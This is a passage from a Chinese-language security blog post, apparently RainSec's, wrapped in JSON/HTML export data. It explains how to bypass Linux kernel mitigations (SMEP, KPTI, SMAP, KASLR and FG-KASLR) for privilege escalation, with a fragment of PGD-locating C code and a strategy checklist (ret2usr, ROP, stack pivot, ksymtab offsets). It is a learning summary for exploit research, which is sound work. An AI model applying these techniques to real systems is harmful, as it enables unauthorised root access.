string\">\"[+] located the PGD: %p\\n\"</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">void</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span>search_addr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t\t<span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token punctuation\">}</span>\n\t\tsearch_addr <span class=\"token operator\">+=</span> <span class=\"token number\">0x1000</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token punctuation\">}</span>\n\n\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"[*] this is the actual PGD: %p\\n\"</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">void</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token function\">leak_pgd</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\n\t<span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>​        如此可以在用户空间通过大量的mmap，然后拿到其物理地址，然后通过内核态的地址转换将该物理地址转换为内核的虚拟地址通过kernel module进行读取就会发现内核可以读取到用户态的数据。</p>\n<p>​        如此就知道绕过的原理了，总结一下就是通过内核空间和用户空间确定相同的物理页然后让kernel进行代码执行。</p>\n<h3 id=\"KASLR-bypass\"><a href=\"#KASLR-bypass\" class=\"headerlink\" title=\"KASLR bypass\"></a>KASLR bypass</h3><p>​        KASLR其实就是内核态的地址随机化，类似用户态的做法，bypass可以通过确定基地址然后加上固定偏移来解决。但是观察<code>/proc/kallsyms</code>的内容发现一些符号其实是完全自己在随机，而不是拥有一个固定的偏移，这就引出了Linux Kernel的一个机制<a href=\"https://lwn.net/Articles/824307/\">Function Granular KASLR</a>，简单来说就是内核在加载的时候会以函数级别重新排布内核代码。</p>\n<p>​        但是FG-KASLR并不完善，一些内核区域并不会随机化：</p>\n<ol>\n<li>不幸，commit_creds 和 prepare_kernel_cred在FG-KASLR的区域。</li>\n<li>swapgs_restore_regs_and_return_to_usermode和__x86_retpoline_r15函数不受到FG-KASLR影响，这能帮助找到一些gadget。</li>\n<li>内核符号表ksymtab不受影响，这里存储了一些偏移可以用于计算prepare_kernel_cred和commit_creds的地址。</li>\n</ol>\n<p>​        第三个比较感兴趣：</p>\n<pre class=\"line-numbers language-c\" data-language=\"c\"><code class=\"language-c\"><span class=\"token keyword\">struct</span> <span class=\"token class-name\">kernel_symbol</span> <span class=\"token punctuation\">{</span>\n\t  <span class=\"token keyword\">int</span> value_offset<span class=\"token punctuation\">;</span>\n\t  <span class=\"token keyword\">int</span> name_offset<span class=\"token punctuation\">;</span>\n\t  <span class=\"token keyword\">int</span> namespace_offset<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>可以看出<code>value_offset</code>应该是比较有趣的，这个对应的值也可以通过<code>/proc/kallsyms</code>获取：</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/L2ksy0d/image-host@master/20220325/image-20220323092910382.png\" alt=\"image-20220323092910382\"></p>\n<p>因此一般就可以在ROP中利用任意读读出相对应的偏移用于计算其它函数的具体位置。</p>\n<h2 id=\"总结-1\"><a href=\"#总结-1\" class=\"headerlink\" title=\"总结\"></a>总结</h2><p>​        网上看到一段总结，感觉很不错：</p>\n<ol>\n<li>如果内核没有保护，就直接ret2usr。</li>\n<li>如果开了SMEP，就用ROP</li>\n<li>溢出或者位置被限制在栈上，就用pivot gadget进行栈迁移。</li>\n<li>KPTI利用KPTI trampoline或者signal handler</li>\n<li>SMAP会导致stack pivot很难利用</li>\n<li>如果没有KASLR，直接泄露地址就能用，开了的话就用基地址 + 偏移。</li>\n<li>如果有FG-KASLR，记得利用ksymtab和不受影响的区域。</li>\n</ol>\n<h2 id=\"参考链接\"><a href=\"#参考链接\" class=\"headerlink\" title=\"参考链接\"></a>参考链接</h2><blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p><a href=\"https://lkmidas.github.io/posts/20210123-linux-kernel-pwn-part-1/\">https://lkmidas.github.io/posts/20210123-linux-kernel-pwn-part-1/</a></p>\n<p><a href=\"https://github.com/pr0cf5/kernel-exploit-practice\">https://github.com/pr0cf5/kernel-exploit-practice</a></p></blockquote>\n","text":"Linux Kernel 保护机制绕过 好久没搞kernel的洞了，最近分析的这方面的洞有点多，相关的Exp任务也比较多，因此学习总结一下方便查找和记忆。 SMEP + KPTI bypass​ SM...","link":"","photos":[],"count_time":{"symbolsCount":"14k","symbolsTime":"12 mins."},"categories":[{"name":"Linux Kernel","slug":"Linux-Kernel","count":1,"path":"api/categories/Linux-Kernel.json"}],"tags":[{"name":"Linux Kernel","slug":"Linux-Kernel","count":1,"path":"api/tags/Linux-Kernel.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#Linux-Kernel-%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6%E7%BB%95%E8%BF%87\"><span class=\"toc-text\">Linux Kernel 保护机制绕过</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#SMEP-KPTI-bypass\"><span class=\"toc-text\">SMEP + KPTI bypass</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#ROP%E7%BB%95%E8%BF%87\"><span class=\"toc-text\">ROP绕过</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#get-root\"><span class=\"toc-text\">get root</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E6%80%BB%E7%BB%93\"><span class=\"toc-text\">总结</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#SMEP-PTI-SMAP-KASLR-bypass\"><span class=\"toc-text\">SMEP+PTI+SMAP+KASLR bypass</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#SMAP\"><span class=\"toc-text\">SMAP</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#SMAP-bypass\"><span class=\"toc-text\">SMAP bypass</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#KASLR-bypass\"><span class=\"toc-text\">KASLR bypass</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E6%80%BB%E7%BB%93-1\"><span class=\"toc-text\">总结</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5\"><span class=\"toc-text\">参考链接</span></a></li></ol></li></ol>","author":{"name":"RainSec","slug":"blog-author","avatar":"https://cdn.staticaly.com/gh/L2ksy0d/image-host@master/20220714/logo.jpg","link":"/","description":"艺术家思维去思考问题，工匠创造精神去开发","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"mapped":true,"prev_post":{"title":"Webshell工具加密流量解析","uid":"06322427d537eca1634c7950b5477253","slug":"Webshell工具加密流量解析","date":"2022-07-19T11:48:45.000Z","updated":"2023-04-12T02:36:51.335Z","comments":true,"path":"api/articles/Webshell工具加密流量解析.json","keywords":null,"cover":"https://cdn.staticaly.com/gh/L2ksy0d/image-host@master/20220722/bingxie.10ryoh4zjlxs.png","text":"前言webshell管理工具作为进一步信息收集、内网渗透、获取更高权限等功能的好帮手，常出现在攻防对抗和渗透测试场景下，其自带的流量加密用来绕过其waf、ids等安全设备的连接，这里简单说下蚁剑、哥斯...","link":"","photos":[],"count_time":{"symbolsCount":"49k","symbolsTime":"45 mins."},"categories":[{"name":"渗透测试","slug":"渗透测试","count":10,"path":"api/categories/渗透测试.json"}],"tags":[],"author":{"name":"RainSec","slug":"blog-author","avatar":"https://cdn.staticaly.com/gh/L2ksy0d/image-host@master/20220714/logo.jpg","link":"/","description":"艺术家思维去思考问题，工匠创造精神去开发","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}},"next_post":{"title":"从IP和样本进行拓线Hunting","uid":"770417add373829189d7a6ca63ee3b8d","slug":"从IP和样本进行拓线Hunting","date":"2022-05-25T10:38:45.000Z","updated":"2023-05-26T06:36:46.115Z","comments":true,"path":"api/articles/从IP和样本进行拓线Hunting.json","keywords":null,"cover":"https://cdn.staticaly.com/gh/L2ksy0d/image-host@master/20220211/image.2ytx72zryfw0.png","text":"从IP和样本进行拓线Hunting前言在情报生产中当你拿到一批样本，应该思考如何通过样本里的C2或者特征去拓线找到更多的恶意样本或者C2链接，本文将给出从一个样本出发进行拓线分析的例子，大佬轻喷。 Q...","link":"","photos":[],"count_time":{"symbolsCount":"3k","symbolsTime":"3 mins."},"categories":[{"name":"Hunting","slug":"Hunting","count":2,"path":"api/categories/Hunting.json"}],"tags":[{"name":"Hunting","slug":"Hunting","count":2,"path":"api/tags/Hunting.json"}],"author":{"name":"RainSec","slug":"blog-author","avatar":"https://cdn.staticaly.com/gh/L2ksy0d/image-host@master/20220714/logo.jpg","link":"/","description":"艺术家思维去思考问题，工匠创造精神去开发","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}}}